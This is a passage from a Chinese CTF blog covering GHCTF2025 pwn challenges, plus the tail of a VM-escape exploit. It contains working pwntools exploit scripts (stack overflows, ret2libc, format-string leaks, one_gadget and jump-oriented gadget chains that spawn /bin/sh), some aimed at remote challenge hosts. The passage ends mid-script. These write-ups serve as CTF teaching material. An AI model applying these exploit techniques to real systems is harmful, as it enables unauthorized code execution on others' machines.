class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;low&#x27;</span>,low)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;R11:&#x27;</span>)</span><br><span class="line">high=<span class="built_in">int</span>(p.recv(<span class="number">5</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;high&#x27;</span>,high)</span><br><span class="line"></span><br><span class="line">stdin=(high&lt;&lt;<span class="number">32</span>)+low</span><br><span class="line">libc_base=stdin-libc.sym[<span class="string">&#x27;stdin&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127354652?spm=1001.2014.3001.5506">OGeek2019 Final]OVM（简易虚拟机逃逸）_vm pwn题-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf-pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vmpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHCTF2025_PWN</title>
      <link href="/posts/52353.html"/>
      <url>/posts/52353.html</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello_world"></a>Hello_world</h1><p>签到题</p><p>开了pie,传后面的两位的字节就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28547</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p16(<span class="number">0x09c5</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p> 这个看懂代码就好，直接ret2libc</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28626</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x400579</span></span><br><span class="line">pop_rdi=<span class="number">0x400d73</span></span><br><span class="line">main=<span class="number">0x400c4f</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;6.check youer money&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How much do you exchange?&#x27;</span>,<span class="string">b&#x27;20000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;6.check youer money&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;You can name it!!!&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;6.check youer money&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;You can name it!!!&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题有几个点需要特别注意</p><p>因为没有pop_rdi这个我们想要的gadget,但是前面存在一个格式化字符串漏洞，我们可以让函数地址跳转到前面漏洞的地址的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">endbr64</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 30h</span><br><span class="line">mov     rax, 6F77206F6C6C6568h</span><br><span class="line">mov     rdx, 0A21646C72h</span><br><span class="line">mov     qword ptr [rbp+format], rax</span><br><span class="line">mov     [rbp+var_8], rdx</span><br><span class="line">lea     rax, [rbp+format]</span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, s          ; &quot;give you a gift.&quot;</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, aShowYourMagic ; &quot;show your magic&quot;</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 60h ; &#x27;`&#x27;  ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 4011FB</span><br><span class="line">func endp</span><br></pre></td></tr></table></figure><p>因为<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503111944288.png" alt="image-20250311194416216"></p><p>结合</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503111944411.png" alt="image-20250311194427390"></p><p>我们在第一次函数返回的时候可以直接打印对我们输入的地址的进行格式化自字符串的利用（控制rax）</p><p>因为函数存在leave 指令，我们rbp的值不能随便覆盖，不然会出问题，<strong>我们只需保证rbp的地址有权限即可</strong></p><p>所以我们选择bss段，注意后面执行其他指令可能会[rbp-0x7x]，所以bss段要加上一个值</p><p>既然覆盖了rbp，那么我们还怎么知道溢出多少字节从而保证让函数执行到我们想要的位置呢</p><p>虽然后面的read会对rbp进行覆盖，但是通过调试可以知道，<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503111955980.png" alt="image-20250311195542916"></p><p>注意rbp的值，两次我传入的rbp覆盖的值不一样，加上先传入的rbp还是会先弹出，所以可以按照前面的长度进行覆盖</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=<span class="number">48</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000401272</span></span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">b&#x27;%27$p&#x27;</span>*<span class="number">5</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ogg=[<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">b&#x27;%27$p&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64((bss+<span class="number">0x500</span>))</span><br><span class="line">payload+=p64(<span class="number">0x401227</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">b&#x27;show your magic&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_addr= <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x29e40</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">libc_base=leak_addr</span><br><span class="line"><span class="comment"># libc_base=leak_addr-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret=libc_base+<span class="number">0x29139</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*offset+p64(bss+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># payload2+=p64(ret)+p64(pop_rdi)</span></span><br><span class="line"><span class="comment"># payload2+=p64(bin_sh_addr)+p64(system_addr)</span></span><br><span class="line">payload2+=p64(libc_base+ogg[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;show your magic&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="你真的会布置栈吗？"><a href="#你真的会布置栈吗？" class="headerlink" title="你真的会布置栈吗？"></a>你真的会布置栈吗？</h1><p>听说这个题目是国际赛题，好你个出题人，新生赛偷偷塞国际题目是吧</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目给的很简单，就是打印一个图案中混着一个栈地址，并且有一个栈溢出,溢出后直接执行我们所需要的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line"></span><br><span class="line">var_8= qword ptr <span class="number">-8</span></span><br><span class="line"></span><br><span class="line">mov     rsi, offset msg1</span><br><span class="line">mov     edx, <span class="number">17B</span>h</span><br><span class="line">call    print</span><br><span class="line">push    rsp</span><br><span class="line">mov     rsi, rsp</span><br><span class="line">mov     edx, <span class="number">8</span></span><br><span class="line">call    print</span><br><span class="line">mov     rsi, offset msg2</span><br><span class="line">mov     edx, <span class="number">235</span>h</span><br><span class="line">call    print</span><br><span class="line">xor     rax, rax</span><br><span class="line">xor     rdi, rdi        ; fd</span><br><span class="line">mov     rsi, rsp        ; buf</span><br><span class="line">mov     edx, <span class="number">539</span>h       ; count</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">jmp     [rsp+<span class="number">8</span>+var_8]</span><br><span class="line">_start endp</span><br></pre></td></tr></table></figure><p>但是这个题目考就考在gadgets的利用，我们来看看这个比赛给我们的gadgets</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> print           proc near               ; CODE XREF: _start+F↓p</span><br><span class="line">.text:<span class="number">0000000000401000</span>                                         ; _start+<span class="number">1</span>D↓p ...</span><br><span class="line">.text:<span class="number">0000000000401000</span>                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401005</span>                 mov     edi, <span class="number">1</span>          ; fd</span><br><span class="line">.text:<span class="number">000000000040100</span>A                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">000000000040100</span>C                 xchg    rax, r13        ;交换这两个寄存器的值</span><br><span class="line">.text:<span class="number">000000000040100</span>E                 jmp     qword ptr [rsp+<span class="number">0</span>]</span><br><span class="line">.text:<span class="number">000000000040100</span>E print           endp</span><br><span class="line">.text:<span class="number">000000000040100</span>E</span><br><span class="line">.text:<span class="number">0000000000401011</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401011</span></span><br><span class="line">.text:<span class="number">0000000000401011</span> dispatcher:</span><br><span class="line">.text:<span class="number">0000000000401011</span>                 add     rbx, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000401015</span>                 jmp     qword ptr [rbx]</span><br><span class="line">.text:<span class="number">0000000000401017</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401017</span></span><br><span class="line">.text:<span class="number">0000000000401017</span> gadgets:</span><br><span class="line">.text:<span class="number">0000000000401017</span>                 pop     rsi</span><br><span class="line">.text:<span class="number">0000000000401018</span>                 pop     rdi</span><br><span class="line">.text:<span class="number">0000000000401019</span>                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040101</span>A                 pop     r13</span><br><span class="line">.text:<span class="number">000000000040101</span>C                 pop     r15</span><br><span class="line">.text:<span class="number">000000000040101</span>E                 jmp     r15</span><br><span class="line">.text:<span class="number">0000000000401021</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401021</span>                 xor     rdx, rdx</span><br><span class="line">.text:<span class="number">0000000000401024</span>                 jmp     r15</span><br><span class="line">.text:<span class="number">0000000000401027</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401027</span>                 xor     rsi, rsi</span><br><span class="line">.text:<span class="number">000000000040102</span>A                 jmp     r15</span><br><span class="line">.text:<span class="number">000000000040102</span>D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040102</span>D                 xor     rdi, rdi</span><br><span class="line">.text:<span class="number">0000000000401030</span>                 jmp     r15</span><br><span class="line">.text:<span class="number">0000000000401033</span></span><br></pre></td></tr></table></figure><p>因为全篇几乎没有一个ret，所以我们执行的gadget只能通过其他的方式来连接</p><blockquote><p>注意，这里有很多的jmp r15 ,还有直接跳转到rsp地址或者rbx地址，所以我们可以通过这些寄存器实现函数的劫持，从而进行提权</p></blockquote><p>我们知道要利用shellcode就需要执行execve(&#x2F;bin&#x2F;sh\x00,0,0)</p><p>也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi----&gt;/bin/sh\x00</span><br><span class="line">rsi----&gt;0</span><br><span class="line">rdx----&gt;0</span><br><span class="line">rax----&gt;59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>因此我们可以直接利用这段代码实现寄存器的值的填入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   pop     rsi</span><br><span class="line">.text:0000000000401018                 pop     rdi</span><br><span class="line">.text:0000000000401019                 pop     rbx</span><br><span class="line">.text:000000000040101A                 pop     r13</span><br><span class="line">.text:000000000040101C                 pop     r15</span><br><span class="line">.text:000000000040101E                 jmp     r15</span><br><span class="line"></span><br><span class="line">.text:000000000040100A                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:000000000040100C                 xchg    rax, r13        ;交换这两个寄存器的值</span><br><span class="line">.text:000000000040100E                 jmp     qword ptr [rsp+0]</span><br><span class="line"></span><br><span class="line">.text:0000000000401021                 xor     rdx, rdx</span><br><span class="line">.text:0000000000401024                 jmp     r15</span><br></pre></td></tr></table></figure><p>这样子就可以控制我们想要的寄存器从而拿到shell</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x28</span></span><br><span class="line">log.success(<span class="string">f&quot;leak&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_r15_j15=<span class="number">0x40101c</span></span><br><span class="line">pop=<span class="number">0x401017</span></span><br><span class="line">syscall=<span class="number">0x40100a</span></span><br><span class="line">r13_rax=<span class="number">0x40100c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(pop_r15_j15)+p64(pop)+p64(<span class="number">0</span>)+p64(leak_addr)+p64(<span class="number">0</span>)+p64(<span class="number">59</span>)+p64(syscall)</span><br><span class="line">payload+=p64(<span class="number">0x401021</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="my-vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>这题和buu上面的一题很像，<a href="https://yufeiyu33.github.io/2025/03/13/VMpwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">VMpwn入门学习 | 鱼非愚</a>具体可以看我这里的</p><p>仿照上面的操作我们，先对execute函数进行逆向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x10: reg[high]=low</span><br><span class="line">0x20: stack[0x642108] = reg[high]</span><br><span class="line">0x30: reg[high] = stack[0x642108]</span><br><span class="line">0x40: reg[high] = reg[low] + reg[middle]</span><br><span class="line">0x50: reg[high] = reg[middle] - reg[low]</span><br><span class="line">0x60: reg[high] = reg[low] ^ reg[middle]</span><br><span class="line">0x70: reg[high] = reg[middle] &gt;&gt; reg[low]</span><br><span class="line">0x80: reg[high] = reg[middle] &lt;&lt; reg[low]</span><br><span class="line">0x90: memory[result] = reg[middle]</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503171928113.png" alt="image-20250317192812028"></p><p>因为这题把后门函数给出来了，我们只需把funcptr这个函数的ptr地址改写为backdoor就行了</p><p>其实这题比较简单，大家可以先把上面我文章里面的复现完，再不看wp写这题，会清晰很多</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><p>exp写的有点乱，主要是开始好几个点都看错了，后面直接缝缝补补了，没有大改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">&#x27;./my_vm&#x27;</span></span><br><span class="line"></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> select == <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28224</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = gdb.debug(local_file)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span 